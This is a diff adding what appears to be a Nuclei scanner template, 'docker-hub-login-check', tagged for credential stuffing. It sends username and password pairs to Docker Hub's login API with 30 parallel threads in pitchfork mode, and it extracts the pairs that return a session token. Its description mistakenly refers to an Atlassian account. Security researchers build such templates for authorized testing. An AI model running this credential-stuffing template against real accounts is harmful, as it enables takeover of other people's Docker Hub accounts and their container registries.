@@ -1,0 +1,49 @@
+id: docker-hub-login-check
+
+info:
+  name: Docker Hub Login Check
+  author: parthmalhotra, pdresearch
+  severity: critical
+  description: Checks for a valid atlassian account.
+  reference:
+    - https://owasp.org/www-community/attacks/Credential_stuffing
+  tags: login-check,docker,creds-stuffing
+
+self-contained: true
+requests:
+  - raw:
+      - |-
+        POST https://hub.docker.com/v2/users/login HTTP/1.1
+        Host: hub.docker.com
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36
+        Connection: close
+        Content-Type: application/json
+
+        {
+          "username": "{{username}}",
+          "password": "{{password}}"
+        }
+
+    threads: 30
+    attack: pitchfork
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'token'
+      - type: word
+        part: header
+        words:
+          - 'Set-Cookie: token='      
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: dsl  
+        dsl:
+          - username
+          - password
